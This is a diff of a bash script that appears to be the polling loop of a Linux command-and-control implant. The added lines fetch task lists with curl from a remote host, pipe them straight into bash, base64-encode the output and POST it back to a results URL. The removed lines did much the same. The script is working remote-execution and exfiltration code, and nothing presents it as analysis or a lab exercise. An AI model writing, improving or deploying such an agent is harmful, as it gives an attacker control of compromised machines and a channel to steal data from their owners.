@@ -15,12 +15,23 @@ resultl="http://$ip:$port/Lin-results/$name/"
 
 while :
 do  
-    tasks=$(curl $taskl)
-    splittasks=$(echo $tasks | tr ";" "\n")
-    for task in $splittasks
-    do
-        echo $($task|base64) >> /tmp/result
-    curl -X POST --data "@/tmp/result" $resultl
-    sleep $n
+	# tasks=0
+    curl $taskl > /tmp/tasks
+
+    # if [ -z "$tasks" ] 
+    splittasks=$(cat /tmp/tasks | tr ";" "\n")
+	while IFS= read -r line 
+	do
+		printf '%s\n' "$line" >> /tmp/tmp
+	done <<< $splittasks
+	sort /tmp/tmp|uniq -u > /tmp/tmps
+
+    cat /tmp/tmps|bash >> /tmp/result
+    base64 /tmp/result > /tmp/enc-result 
+    # sleep $n
+    curl -X POST --data "@/tmp/enc-result" $resultl
     rm /tmp/result
+    rm /tmp/tmp
+	    
 done
+
